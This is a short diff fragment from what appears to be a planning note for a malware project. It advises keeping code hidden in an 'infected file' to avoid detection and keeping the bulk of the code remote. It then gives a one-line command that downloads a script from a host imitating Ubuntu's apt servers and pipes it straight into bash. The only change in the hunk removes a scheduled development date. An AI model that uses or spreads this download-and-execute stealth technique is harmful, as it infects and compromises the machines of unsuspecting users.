@@ -10,4 +10,3 @@ How:
 Now, you don't want your code to be sticking out of the infected file and be detected. Keep the bulk of your code remote.
 wget -O - http://fake-apt-ubuntu-com.com/file | bash
 
-Development scheduled to start post 14th of December, 2017.
